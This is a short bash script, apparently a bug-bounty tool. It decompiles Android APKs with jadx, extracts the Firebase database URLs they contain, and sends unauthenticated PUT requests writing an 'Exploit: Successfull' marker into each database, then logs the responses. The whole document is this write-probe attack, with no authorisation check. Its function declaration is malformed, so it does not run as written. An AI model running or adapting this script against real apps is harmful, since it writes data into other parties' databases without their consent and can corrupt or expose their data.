#!/bin/bash
jadxfirbase{
    jadx *.apk
    urls=$(grep -w 'firebaseio' -r ./ | grep -Eo 'https?://[^ ]+[^<]*' | sed 's|</string>||g')
    json_data='{"Exploit":"Successfull", "H4CK": "404"}'

    response_file="/usr//bb_results/jadxresults/all_responses.txt"
    > "$response_file"
    for url in $urls; do
        echo "Sending request to: ${url}/test404.json"
        response=$(curl -s -w "%{http_code}" -o response_body.txt -X PUT -H "Content-Type: application/json" -d "$json_data" "${url}/test404.json")
        response_body=$(<response_body.txt)
        echo "URL: $url" >> "$response_file"
        echo "Response Code: $response" >> "$response_file"
        echo "Response Body: $response_body" >> "$response_file"
        echo "----------------------------------------" >> "$response_file"
        echo "Response Code: $response"
        rm response_body.txt
    done
    echo "All responses stored in $response_file"
}
